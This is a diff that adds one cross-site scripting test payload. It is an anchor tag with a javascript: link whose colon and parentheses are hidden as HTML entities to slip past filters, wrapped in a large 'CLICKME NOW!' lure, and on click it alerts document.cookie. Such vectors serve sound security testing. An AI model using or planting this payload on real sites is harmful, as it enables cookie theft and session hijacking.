@@ -1,0 +1,7 @@
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>
+X X X X X X X X X X X X X X X<br>
+X X X X X X X X X X X X X X X<br>
+X X X X CLICKME NOW!  X X X X<br>
+X X X X X X X X X X X X X X X<br>
+X X X X X X X X X X X X X X X</a>
+
